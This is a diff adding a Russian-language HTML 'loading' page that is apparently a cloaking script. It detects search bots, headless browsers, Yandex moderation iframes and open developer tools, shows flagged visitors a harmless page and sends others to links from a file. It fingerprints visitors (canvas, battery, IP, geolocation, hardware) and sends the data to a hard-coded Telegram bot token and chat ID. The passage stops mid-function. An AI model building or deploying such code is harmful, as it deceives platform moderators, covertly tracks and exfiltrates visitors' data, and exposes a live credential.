@@ -1,0 +1,1441 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <!-- Yandex.Metrika counter -->
+    <script type="text/javascript" >
+       (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+       m[i].l=1*new Date();
+       for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+       k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+       (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+       ym(101122135, "init", {
+            clickmap:true,
+            trackLinks:true,
+            accurateTrackBounce:true
+       });
+    </script>
+    <noscript><div><img src="https://mc.yandex.ru/watch/101122135" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+    <!-- /Yandex.Metrika counter -->
+    <style>
+        /* Адаптивные стили для анимации загрузки */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .loader-container {
+            text-align: center;
+            max-width: 80%;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 18px;
+            color: #333;
+        }
+        #debug-info {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            max-width: 90%;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+            display: none;
+        }
+        /* Скрытая ссылка-ловушка для ботов */
+        .bot-trap {
+            position: absolute;
+            opacity: 0;
+            height: 1px;
+            width: 1px;
+            overflow: hidden;
+            clip: rect(1px, 1px, 1px, 1px);
+            pointer-events: none; /* Для реальных пользователей */
+        }
+        /* Для ботов, которые игнорируют CSS */
+        .bot-trap-link {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            font-size: 1px;
+            color: transparent;
+        }
+        @media (max-width: 768px) {
+            .loader {
+                width: 40px;
+                height: 40px;
+            }
+            .loading-text {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="loader"></div>
+        <div class="loading-text">Загрузка, пожалуйста подождите...</div>
+    </div>
+    
+    <!-- Скрытая ссылка-ловушка для ботов -->
+    <div class="bot-trap" aria-hidden="true">
+        <a href="https://dzen.ru" class="bot-trap-link" tabindex="-1">скрытая ссылка</a>
+    </div>
+    
+    <!-- Отладочная информация (скрыта по умолчанию) -->
+    <div id="debug-info"></div>
+
+    <script>
+        // Включить отладочный режим (установите true для отображения подробной информации)
+        const DEBUG_MODE = false;
+        
+        // Константы для URL страниц
+        const WHITE_PAGE = 'https://dzen.ru';     // Для ботов и модераторов
+        const BLACK_PAGE = 'https://google.com';  // Для обычных посетителей
+        
+        // Константы для Telegram-бота
+        const TELEGRAM_BOT_TOKEN = '7853695428:AAFhxiIHq67-UOQbP7bJ4FrH0EmwtWGswNU';
+        const TELEGRAM_CHAT_ID = '1237450939';
+        
+        // Метка начала загрузки страницы для определения раннего ухода
+        const PAGE_LOAD_START = Date.now();
+        let pageFullyLoaded = false;
+        
+        // Системные переменные для отслеживания кликов по ловушке
+        let botTrapActivated = false;
+        
+        // Отслеживаем движения мыши для ПК-устройств
+        let hadMouseMovement = false;
+        
+        // Отслеживаем количество посещений
+        let visitCount = 0;
+        try {
+            visitCount = parseInt(localStorage.getItem('total_visits') || '0', 10);
+            localStorage.setItem('total_visits', (visitCount + 1).toString());
+        } catch (e) {
+            console.log('Ошибка при подсчете посещений:', e);
+        }
+        
+        // Создаем канву для fingerprinting
+        const getCanvasFingerprint = () => {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                // Рисуем текст с градиентом
+                const txt = 'Canvas Fingerprint';
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText(txt, 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText(txt, 4, 17);
+                
+                return canvas.toDataURL().replace('data:image/png;base64,', '').substring(0, 30) + '...';
+            } catch (e) {
+                return 'Canvas не поддерживается';
+            }
+        };
+        
+        // Функция для определения мобильного устройства
+        function isMobileDevice() {
+            // Проверка по User-Agent
+            const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS/i;
+            const userAgent = navigator.userAgent;
+            
+            // Проверка по наличию touch-событий
+            const hasTouchEvents = 'ontouchstart' in window || 
+                                  navigator.maxTouchPoints > 0 || 
+                                  navigator.msMaxTouchPoints > 0;
+            
+            // Проверка размера экрана (типичного для мобильных)
+            const smallScreen = window.innerWidth <= 800 || window.innerHeight <= 600;
+            
+            // Проверка на наличие специфичных мобильных API
+            const hasMobileAPI = ('orientation' in window) || ('DeviceOrientationEvent' in window);
+            
+            // Результат по нескольким факторам для уменьшения вероятности ошибки
+            const isMobile = mobileRegex.test(userAgent) || 
+                            (hasTouchEvents && smallScreen) ||
+                            (hasMobileAPI && hasTouchEvents);
+            
+            debugLog(`Определение устройства: ${isMobile ? 'Мобильное' : 'Десктоп'}`);
+            
+            return isMobile;
+        }
+        
+        // Функция для логирования с отображением на странице в отладочном режиме
+        function debugLog(message) {
+            console.log(message);
+            if (DEBUG_MODE) {
+                const debugElement = document.getElementById('debug-info');
+                debugElement.style.display = 'block';
+                debugElement.innerHTML += message + '<br>';
+                // Автоматическая прокрутка вниз
+                debugElement.scrollTop = debugElement.scrollHeight;
+            }
+        }
+        
+        // Расширенный список User-Agent ботов для максимального охвата поисковых систем
+        const SEARCH_BOT_AGENTS = [
+            // Яндекс боты
+            /YandexBot/i, /YandexAccessibilityBot/i, /YandexMobileBot/i, /YandexDirectDyn/i,
+            /YandexImages/i, /YandexVideo/i, /YandexVideoParser/i, /YandexMedia/i,
+            /YandexBlogs/i, /YandexFavicons/i, /YandexWebmaster/i, /YandexPagechecker/i,
+            /YandexImageResizer/i, /YaDirectFetcher/i, /YandexCalendar/i, /YandexSitelinks/i,
+            /YandexMetrika/i, /YandexNews/i, /YandexCatalog/i, /YandexMarket/i,
+            /YandexVerticals/i, /YandexVertis/i, /YandexSearchShop/i, /YandexOntoDB/i,
+            /YandexOntoDBAPI/i, /YandexRCA/i, /YandexSpravBot/i, /YandexScreenshotBot/i,
+            /YandexMobileScreenShotBot/i, /YandexAdNet/i, /YandexDirect/i, /YandexTurbo/i,
+            /YandexRenderResourcesBot/i, /YandexTracker/i, /YandexPartner/i, /YandexComBot/i,
+            /YandexUserproxy/i, /YandexAdditionalBot/i, /YandexDialogs/i, /MirrorDetector/i,
+            /YandexAdditional/i,
+            
+            // Google боты
+            /Googlebot/i, /AdsBot-Google/i, /Google-Read-Aloud/i, /DuplexWeb-Google/i,
+            /Google Favicon/i, /googleweblight/i, /Storebot-Google/i, /Google-PageRenderer/i,
+            /Google-Site-Verification/i, /Google-SearchByImage/i, /GoogleAccessibilityTest/i,
+            /GoogleProducer/i, /APIs-Google/i, /Google-Adwords-Instant/i, /FeedFetcher-Google/i,
+            /Google-Apps-Script/i,
+            
+            // Microsoft/Bing боты
+            /bingbot/i, /msnbot/i, /BingPreview/i, /AdIdxBot/i, /MicrosoftPreview/i, /MicrosoftSearch/i,
+            
+            // Другие поисковые боты
+            /slurp/i, /duckduckbot/i, /baiduspider/i, /Yahoo! Slurp/i, /YahooSeeker/i,
+            /Exabot/i, /facebookexternalhit/i, /ia_archiver/i, /WhatsApp/i,
+            /Applebot/i, /archive.org_bot/i, /BuiltWith/i, /Bot.AraTear/i, /BUbiNG/i,
+            /Chrome-Lighthouse/i, /Clickagy/i, /CliniqueBot/i, /DomainStatsBot/i, /evc-batch/i,
+            
+            // Общие паттерны для ботов
+            /bot/i, /spider/i, /crawler/i, /scraper/i, /checker/i, /archiver/i, /validator/i,
+            /fetcher/i, /parser/i, /reader/i, /indexer/i, /panscient/i, /monitoring/i,
+            
+            // SEO/Аналитические инструменты
+            /semrush/i, /ahrefs/i, /mj12bot/i, /majestic/i, /rogerbot/i, /dotbot/i,
+            /screaming/i, /seokicks/i, /sistrix/i, /seobilitybot/i, /seoscanners/i,
+            /proximic/i, /pingdom/i, /gtmetrix/i, /pagespeed/i, /webmeup/i, /Catchpoint/i,
+            /Riddler/i, /Nessus/i, /datasift/i, /BLEXBot/i, /AspiegelBot/i, /ScoutJet/i,
+            
+            // Новые боты из 2023
+            /bytespider/i, /petalbot/i, /DeepCrawl/i, /Sogou/i, /MojeekBot/i, /DuckDuckGo/i,
+            /SeznamBot/i, /Mail.RU_Bot/i, /SemrushBot/i, /Qwantify/i, /CensysInspect/i,
+            /PetalBot/i, /Cliqzbot/i, /QwantMobile/i, /coccocbot/i, /EarwigBot/i,
+            /NetcraftSurveyAgent/i, /weborama-fetcher/i, /BrightSign/i, /Cookiebot/i,
+            /DataForSeoBot/i
+        ];
+        
+        // Домены Яндекса для проверки обратного DNS
+        const YANDEX_DOMAINS = [
+            '.yandex.ru', '.yandex.net', '.yandex.com', '.yandex.by', '.yandex.kz', 
+            '.yandex.ua', '.yandex.md', '.yandex.com.tr', '.yandex.com.am'
+        ];
+        
+        // Автономные системы Яндекса
+        const YANDEX_ASN = ['AS13238', 'AS208722'];
+        
+        // Функция для сбора информации о пользователе с улучшенными метриками
+        async function collectUserInfo() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language || navigator.userLanguage,
+                platform: navigator.platform,
+                deviceType: isMobileDevice() ? 'Мобильное' : 'Десктоп',
+                visitCount: visitCount,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                pixelRatio: window.devicePixelRatio || 'unknown',
+                colorDepth: window.screen.colorDepth || 'unknown',
+                referrer: document.referrer || 'none',
+                url: window.location.href,
+                cookies: navigator.cookieEnabled ? 'enabled' : 'disabled',
+                localStorage: typeof localStorage !== 'undefined' ? 'available' : 'unavailable',
+                plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).slice(0, 5).join(', ') : 'unknown',
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+                connection: navigator.connection ? 
+                    `${navigator.connection.effectiveType || 'unknown'} (RTT: ${navigator.connection.rtt || 'unknown'})` : 'unknown',
+                webdriver: navigator.webdriver ? 'yes' : 'no',
+                languages: Array.isArray(navigator.languages) ? navigator.languages.join(', ') : 'unknown',
+                doNotTrack: navigator.doNotTrack || 'unknown',
+                battery: 'checking...',
+                canvasFingerprint: getCanvasFingerprint(),
+                hadMouseMovement: hadMouseMovement ? 'yes' : 'no',
+                ip: 'pending...',
+                location: 'pending...',
+                botTrapInteracted: botTrapActivated ? 'ДА! (Ловушка сработала)' : 'нет',
+                pageLoadTime: (Date.now() - PAGE_LOAD_START) + 'мс'
+            };
+            
+            // Пытаемся получить информацию о батарее
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    info.battery = `Заряд: ${Math.round(battery.level * 100)}%, Заряжается: ${battery.charging ? 'да' : 'нет'}`;
+                }
+            } catch (e) {
+                info.battery = 'Ошибка получения';
+            }
+            
+            // Попытка получить IP-адрес и геолокацию
+            try {
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://ipinfo.io/json',
+                    'https://api.myip.com',
+                    'https://ipapi.co/json/'
+                ];
+                
+                for (const service of ipServices) {
+                    try {
+                        const response = await fetch(service);
+                        if (response.ok) {
+                            const data = await response.json();
+                            info.ip = data.ip || data.myip || 'unknown';
+                            
+                            // Формируем строку геолокации
+                            const locationParts = [];
+                            if (data.country) locationParts.push(data.country);
+                            if (data.city) locationParts.push(data.city);
+                            
+                            if (locationParts.length > 0) {
+                                info.location = locationParts.join(', ');
+                            } else {
+                                info.location = 'Не определено';
+                            }
+                            
+                            // Больше не проверяем другие сервисы, если получили данные
+                            break;
+                        }
+                    } catch (e) {
+                        continue;
+                    }
+                }
+            } catch (e) {
+                info.ip = 'failed to detect';
+                info.location = 'Не определено';
+            }
+            
+            return info;
+        }
+        
+        // Функция для отправки отчета в Telegram (обновленный формат)
+        async function sendTelegramReport(blockReason, userInfo) {
+            try {
+                // Формируем эмодзи статус блокировки
+                const blockEmoji = userInfo.botTrapInteracted ? '🪤 *КЛОАКА: ЛОВУШКА СРАБОТАЛА*' : '🚫 *КЛОАКА: БЛОКИРОВКА*';
+                
+                // Форматирование сообщения с эмодзи и разметкой Markdown
+                const message = `${blockEmoji}\n\n` +
+                    `⚠️ *Причина*: ${blockReason}\n\n` +
+                    `📱 *Тип устройства*: ${userInfo.deviceType}\n` +
+                    `🔢 *Счетчик посещений*: ${userInfo.visitCount}\n` +
+                    `🌐 *IP*: \`${userInfo.ip}\`\n` +
+                    `📍 *Геолокация*: ${userInfo.location}\n` +
+                    `🖥️ *User-Agent*: \`${userInfo.userAgent}\`\n` +
+                    `📏 *Экран*: ${userInfo.screenSize} (${userInfo.pixelRatio}x)\n` +
+                    `⏱️ *Время загрузки*: ${userInfo.pageLoadTime}\n` +
+                    `🔗 *URL*: ${userInfo.url}\n` +
+                    `↩️ *Referrer*: ${userInfo.referrer}\n\n` +
+                    `🖱️ *Движение мыши*: ${userInfo.hadMouseMovement}\n` +
+                    `🔋 *Батарея*: ${userInfo.battery}\n` +
+                    `🧠 *Ядра CPU*: ${userInfo.cores}\n` +
+                    `💾 *Память*: ${userInfo.memory}\n` +
+                    `🌍 *Язык*: ${userInfo.language}\n` +
+                    `⏰ *Часовой пояс*: ${userInfo.timezone}\n` +
+                    `🔌 *Соединение*: ${userInfo.connection}\n` +
+                    `🤖 *WebDriver*: ${userInfo.webdriver}\n` +
+                    `🎨 *Canvas*: ${userInfo.canvasFingerprint}`;
+                
+                // Кодирование URL-параметров
+                const encodedMessage = encodeURIComponent(message);
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+                
+                // Отправка запроса к Telegram API
+                const response = await fetch(telegramUrl);
+                const data = await response.json();
+                
+                if (data.ok) {
+                    debugLog(`✅ Отчет о блокировке успешно отправлен в Telegram`);
+                } else {
+                    debugLog(`❌ Ошибка при отправке отчета в Telegram: ${data.description}`);
+                    
+                    // Попытка отправить без разметки, если была проблема с форматированием
+                    if (data.description && data.description.includes("can't parse entities")) {
+                        const plainMessage = message.replace(/\*/g, '').replace(/`/g, '');
+                        const encodedPlainMessage = encodeURIComponent(plainMessage);
+                        const backupUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedPlainMessage}`;
+                        
+                        try {
+                            const backupResponse = await fetch(backupUrl);
+                            const backupData = await backupResponse.json();
+                            if (backupData.ok) {
+                                debugLog(`✅ Отчет отправлен без форматирования`);
+                            }
+                        } catch (e) {
+                            debugLog(`❌ Не удалось отправить даже без форматирования: ${e.message}`);
+                        }
+                    }
+                }
+            } catch (error) {
+                debugLog(`❌ Исключение при отправке отчета в Telegram: ${error.message}`);
+            }
+        }
+        
+        // Функция для получения параметров из URL
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            const results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+        
+        // Улучшенная функция для загрузки файла с использованием XMLHttpRequest
+        function loadFile(filename) {
+            return new Promise((resolve, reject) => {
+                const xhr = new XMLHttpRequest();
+                // Добавляем случайный параметр для предотвращения кэширования
+                const nocacheParam = `nocache=${new Date().getTime()}`;
+                xhr.open('GET', `${filename}?${nocacheParam}`, true);
+                xhr.responseType = 'text';
+                
+                // Устанавливаем таймаут
+                xhr.timeout = 5000;
+                
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        debugLog(`Файл ${filename} успешно загружен`);
+                        resolve(xhr.responseText);
+                    } else {
+                        debugLog(`Ошибка загрузки файла ${filename}: HTTP статус ${xhr.status}`);
+                        reject(new Error(`HTTP статус ${xhr.status}`));
+                    }
+                };
+                
+                xhr.ontimeout = function() {
+                    debugLog(`Таймаут при загрузке файла ${filename}`);
+                    reject(new Error('Timeout'));
+                };
+                
+                xhr.onerror = function() {
+                    debugLog(`Ошибка сети при загрузке файла ${filename}`);
+                    reject(new Error('Network Error'));
+                };
+                
+                xhr.send();
+            });
+        }
+        
+        // Функция для загрузки целевой ссылки на основе параметра и файла links.txt
+        async function getTargetLinkFromFile() {
+            try {
+                // Получаем значение атрибута из URL
+                const linkCode = getUrlParameter('code');
+                
+                // Если параметр не указан, возвращаем BLACK_PAGE по умолчанию
+                if (!linkCode) {
+                    debugLog('Параметр code не указан, используем BLACK_PAGE по умолчанию');
+                    return BLACK_PAGE;
+                }
+                
+                // Пытаемся загрузить файл links.txt
+                let linksText;
+                try {
+                    linksText = await loadFile('links.txt');
+                } catch (error) {
+                    debugLog(`Не удалось загрузить links.txt: ${error.message}`);
+                    return BLACK_PAGE;
+                }
+                
+                // Разбиваем на строки и фильтруем пустые строки
+                const links = linksText.split('\n')
+                    .map(link => link.trim())
+                    .filter(link => link && link.length > 0);
+                
+                debugLog(`Загружено ${links.length} ссылок из файла links.txt`);
+                
+                // Если файл пуст, возвращаем BLACK_PAGE
+                if (links.length === 0) {
+                    debugLog('Файл links.txt пуст, используем BLACK_PAGE по умолчанию');
+                    return BLACK_PAGE;
+                }
+                
+                // Преобразуем code в число
+                const codeNumber = parseInt(linkCode, 10);
+                
+                // Если code не является числом, возвращаем BLACK_PAGE
+                if (isNaN(codeNumber) || codeNumber < 1) {
+                    debugLog('Параметр code некорректен, используем BLACK_PAGE по умолчанию');
+                    return BLACK_PAGE;
+                }
+                
+                // Если code превышает количество строк, выбираем случайную ссылку
+                if (codeNumber > links.length) {
+                    const randomIndex = Math.floor(Math.random() * links.length);
+                    const randomLink = links[randomIndex];
+                    debugLog(`Параметр code (${codeNumber}) превышает количество строк (${links.length}), выбрана случайная ссылка: ${randomLink}`);
+                    return randomLink;
+                }
+                
+                // Иначе выбираем ссылку по указанному индексу (с поправкой на индексацию с 0)
+                const selectedLink = links[codeNumber - 1];
+                debugLog(`Выбрана ссылка по индексу ${codeNumber}: ${selectedLink}`);
+                return selectedLink;
+                
+            } catch (error) {
+                debugLog(`Ошибка при получении целевой ссылки: ${error.message}`);
+                return BLACK_PAGE;
+            }
+        }
+        
+        // Расширенная функция для обнаружения ботов поисковых систем (для всех устройств)
+        function isSearchBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // Проверка по общим паттернам ботов
+            for (let i = 0; i < SEARCH_BOT_AGENTS.length; i++) {
+                if (SEARCH_BOT_AGENTS[i].test(userAgent)) {
+                    return `Обнаружен поисковый бот в User-Agent: ${SEARCH_BOT_AGENTS[i]}`;
+                }
+            }
+            
+            // Дополнительные проверки для поисковых ботов:
+            
+            // 1. Проверка на наличие специфичных HTTP-заголовков
+            // (Примечание: заголовки доступны только на сервере, но можно проверить косвенно)
+            if (window.navigator && window.navigator.userAgentData && window.navigator.userAgentData.brands) {
+                const brands = window.navigator.userAgentData.brands;
+                const suspiciousBrands = ['Googlebot', 'GoogleOther', 'YandexBot', 'BingBot', 'BaiduBot'];
+                
+                for (const brand of brands) {
+                    if (suspiciousBrands.includes(brand.brand)) {
+                        return `Обнаружен бот в userAgentData.brands: ${brand.brand}`;
+                    }
+                }
+            }
+            
+            // 2. Проверка на отсутствие основных API браузера
+            if (typeof window.localStorage === 'undefined' || 
+                typeof window.sessionStorage === 'undefined' || 
+                typeof window.indexedDB === 'undefined') {
+                return 'Обнаружено отсутствие ключевых API браузера';
+            }
+            
+            // 3. Проверка на наличие известных объектов ботов
+            if (window._phantom || 
+                window.phantom || 
+                window.callPhantom || 
+                window.__phantomas || 
+                window.Buffer || 
+                window.spawn || 
+                window.emit) {
+                return 'Обнаружены объекты headless/phantom браузера';
+            }
+            
+            return false;
+        }
+        
+        // Расширенная функция для обнаружения Headless браузера и автоматизации
+        function isHeadlessBrowser() {
+            const isMobile = isMobileDevice();
+            
+            // Классические проверки на WebDriver и PhantomJS
+            if (navigator.webdriver) {
+                return 'Обнаружен WebDriver';
+            }
+            
+            if (window.callPhantom || window._phantom || window.phantom) {
+                return 'Обнаружены объекты PhantomJS';
+            }
+            
+            if (window.__nightmare) {
+                return 'Обнаружен Nightmare.js';
+            }
+            
+            // Проверка на Puppeteer/Playwright
+            const puppeteerObjects = [
+                '__webdriver_evaluate', 
+                '__webdriver_script_function', 
+                '__webdriver_script_fn', 
+                '__webdriver_script_func', 
+                '__selenium_evaluate',
+                '__selenium_unwrapped', 
+                '__fxdriver_evaluate', 
+                '__driver_unwrapped', 
+                '__driver_evaluate', 
+                '__selenium_unwrapped',
+                '__fxdriver_unwrapped', 
+                'domAutomation', 
+                'domAutomationController', 
+                '_WEBDRIVER_ELEM_CACHE'
+            ];
+            
+            // Проверка на присутствие Puppeteer/Playwright/Selenium объектов
+            for (const obj of puppeteerObjects) {
+                if (obj in window || obj in document) {
+                    return `Обнаружен объект автоматизации: ${obj}`;
+                }
+            }
+            
+            // Детектирование особенностей Selenium
+            if (window.document.documentElement.getAttribute('webdriver') ||
+                window.document.documentElement.getAttribute('selenium') ||
+                window.document.documentElement.getAttribute('driver')) {
+                return 'Обнаружены атрибуты Selenium';
+            }
+            
+            // Проверка на Chromium Automation Extension
+            if ('domAutomation' in window || 'domAutomationController' in window) {
+                return 'Обнаружено расширение автоматизации Chromium';
+            }
+            
+            // Проверка навигатора
+            if (navigator.languages === undefined) {
+                return 'Обнаружено отсутствие navigator.languages';
+            }
+            
+            // Только для десктопных устройств - проверка пустого массива languages
+            if (!isMobile && navigator.languages.length === 0) {
+                return 'Обнаружен пустой массив navigator.languages';
+            }
+            
+            // Только для десктопных устройств - проверка плагинов
+            if (!isMobile && navigator.plugins.length === 0) {
+                return 'Обнаружено отсутствие плагинов браузера';
+            }
+            
+            // Проверка на Chrome в Headless режиме
+            if ('chrome' in window && !window.chrome) {
+                return 'Обнаружено несоответствие в объекте chrome';
+            }
+            
+            // Проверка на специфические объекты Playwright
+            if (window.playwright) {
+                return 'Обнаружен объект playwright';
+            }
+            
+            // Проверка на наличие специфичных объектов Puppeteer
+            if (window.puppeteer || 
+                window._pptr || 
+                window.__pptrCDPConnection || 
+                window.__PUPPETEER__) {
+                return 'Обнаружен объект puppeteer';
+            }
+            
+            // Проверка на определенные ошибки, характерные для автоматизации
+            try {
+                // Проверка на ошибки бота
+                const e = document.createEvent('TouchEvent');
+                return false;
+            } catch (e) {
+                // Анализ ошибки на предмет Puppeteer/Playwright
+                const errorString = e.toString();
+                if (errorString.includes('puppeteer') || 
+                    errorString.includes('playwright') || 
+                    errorString.includes('webdriver')) {
+                    return `Обнаружен след автоматизации в обработке ошибок: ${errorString.substring(0, 50)}`;
+                }
+            }
+            
+            return false;
+        }
+        
+        // Улучшенная функция для обнаружения iframe-yang.yandex (для всех устройств)
+        function hasYandexModeratorIframe() {
+            // 1. Более точная проверка всех имеющихся iframe при загрузке
+            const checkIframes = () => {
+                const iframes = document.querySelectorAll('iframe');
+                for (let i = 0; i < iframes.length; i++) {
+                    const iframe = iframes[i];
+                    // Проверка по src атрибуту
+                    if (iframe.src && (
+                        iframe.src.includes('iframe-yang.yandex') || 
+                        iframe.src.includes('yandex-verification') ||
+                        iframe.src.includes('iframe.yandex') ||
+                        iframe.src.includes('yang.yandex')
+                    )) {
+                        return `Обнаружен iframe Яндекса (модерация): ${iframe.src}`;
+                    }
+                    
+                    // Проверка по наличию специфичных атрибутов
+                    if (iframe.hasAttribute('data-yandex-verification') || 
+                        iframe.hasAttribute('yandex-verification') ||
+                        iframe.hasAttribute('yang-verification')) {
+                        return 'Обнаружен iframe с атрибутами Яндекса (модерация)';
+                    }
+                }
+                return false;
+            };
+
+            // Начальная проверка
+            const iframeResult = checkIframes();
+            if (iframeResult) return iframeResult;
+            
+            // 2. Проверка на наличие переменных и объектов, характерных для модерационных iframe
+            if (window.YandexSafeFrame || 
+                window.YandexModeration || 
+                window._ym_yang || 
+                window.yang || 
+                window.YandexSafeFrameCallbacks ||
+                window.YandexZen ||
+                window.YaStatisticCounter) {
+                return 'Обнаружены объекты Яндекс-модерации в window';
+            }
+            
+            // 3. Настраиваем обнаружение динамически добавляемых iframe
+            try {
+                // Создаем MutationObserver для отслеживания изменений в DOM
+                const observer = new MutationObserver((mutations) => {
+                    mutations.forEach((mutation) => {
+                        // Проверяем добавленные узлы
+                        if (mutation.addedNodes && mutation.addedNodes.length) {
+                            for (let i = 0; i < mutation.addedNodes.length; i++) {
+                                const node = mutation.addedNodes[i];
+                                
+                                // Если добавлен iframe напрямую
+                                if (node.nodeName === 'IFRAME') {
+                                    if (node.src && (
+                                        node.src.includes('iframe-yang.yandex') || 
+                                        node.src.includes('yandex-verification') ||
+                                        node.src.includes('iframe.yandex') ||
+                                        node.src.includes('yang.yandex')
+                                    )) {
+                                        debugLog(`Обнаружен динамически добавленный iframe Яндекса: ${node.src}`);
+                                        observer.disconnect();
+                                        // Этот фрагмент будет обработан особым образом в основной логике
+                                        window._blockReason = `Обнаружен динамически добавленный iframe Яндекса: ${node.src}`;
+                                        collectUserInfo().then(userInfo => {
+                                            sendTelegramReport(window._blockReason, userInfo);
+                                            window.location.href = WHITE_PAGE;
+                                        });
+                                        return;
+                                    }
+                                }
+                                
+                                // Если добавлен контейнер, который может содержать iframe
+                                if (node.querySelectorAll) {
+                                    const nestedIframes = node.querySelectorAll('iframe');
+                                    for (let j = 0; j < nestedIframes.length; j++) {
+                                        const iframe = nestedIframes[j];
+                                        if (iframe.src && (
+                                            iframe.src.includes('iframe-yang.yandex') || 
+                                            iframe.src.includes('yandex-verification') ||
+                                            iframe.src.includes('iframe.yandex') ||
+                                            iframe.src.includes('yang.yandex')
+                                        )) {
+                                            debugLog(`Обнаружен iframe Яндекса в динамическом контенте: ${iframe.src}`);
+                                            observer.disconnect();
+                                            // Этот фрагмент будет обработан особым образом в основной логике
+                                            window._blockReason = `Обнаружен iframe Яндекса в динамическом контенте: ${iframe.src}`;
+                                            collectUserInfo().then(userInfo => {
+                                                sendTelegramReport(window._blockReason, userInfo);
+                                                window.location.href = WHITE_PAGE;
+                                            });
+                                            return;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    });
+                });
+                
+                // Начинаем наблюдение за всем документом
+                observer.observe(document.documentElement, {
+                    childList: true,
+                    subtree: true
+                });
+                
+                // Сохраняем ссылку на observer для возможности отключения
+                window._iframeObserver = observer;
+                
+            } catch (e) {
+                debugLog(`Ошибка при настройке наблюдателя за iframe: ${e.message}`);
+            }
+            
+            return false;
+        }
+        
+        // Расширенная функция для проверки Яндекс ботов на основе характеристик (для всех устройств)
+        function isYandexBotByBehavior() {
+            try {
+                // Проверка объектов Яндекса в DOM
+                if (typeof window.YandexMetrika !== 'undefined' || 
+                    typeof window.Ya !== 'undefined' || 
+                    typeof window.yandex !== 'undefined') {
+                    // Это НЕ помечаем как бота, так как метрика есть у нас на странице
+                    // Проверяем только специфичные объекты, не относящиеся к метрике
+                    if (window.Ya && window.Ya.Context && window.Ya.Context.AdvManager) {
+                        // Объекты рекламной сети Яндекса - не считаем ботом
+                        return false;
+                    }
+                    
+                    // Проверяем на наличие объектов ботов, отличных от метрики и РСЯ
+                    if (window.YandexBot || 
+                        window.YaSearchBot || 
+                        window.YandexCrawler || 
+                        window.YandexVerifyBot) {
+                        return 'Обнаружены специфичные объекты бота Яндекса';
+                    }
+                }
+                
+                // Проверка скриптов Яндекса (ИСКЛЮЧАЯ метрику и РСЯ)
+                const scripts = document.getElementsByTagName('script');
+                for (let i = 0; i < scripts.length; i++) {
+                    if (scripts[i].src && 
+                        (scripts[i].src.includes('/bot') || 
+                         scripts[i].src.includes('yandex.ru/crawler') ||
+                         scripts[i].src.includes('yandex.ru/verification') ||
+                         scripts[i].src.includes('yandex.com/bots'))) {
+                        return `Обнаружен скрипт бота Яндекса: ${scripts[i].src}`;
+                    }
+                }
+            } catch (e) {
+                debugLog(`Ошибка при анализе поведения: ${e.message}`);
+            }
+            
+            return false;
+        }
+        
+        // Расширенная функция для проверки модераторов (для всех устройств)
+        function isLikelyModerator() {
+            const isMobile = isMobileDevice();
+            
+            // Проверка девелоперских инструментов - только для десктопа
+            if (!isMobile) {
+                // Метод 1: Проверка разницы размеров окна
+                if (window.outerHeight - window.innerHeight > 200 || 
+                    window.outerWidth - window.innerWidth > 200) {
+                    return 'Обнаружены открытые DevTools (по размеру окна)';
+                }
+                
+                // Метод 2: Фиребаг-детектор
+                if (window.console && window.console.firebug) {
+                    return 'Обнаружен Firebug';
+                }
+                
+                // Метод 3: Детектор консоли через timing attack
+                const startTime = performance.now();
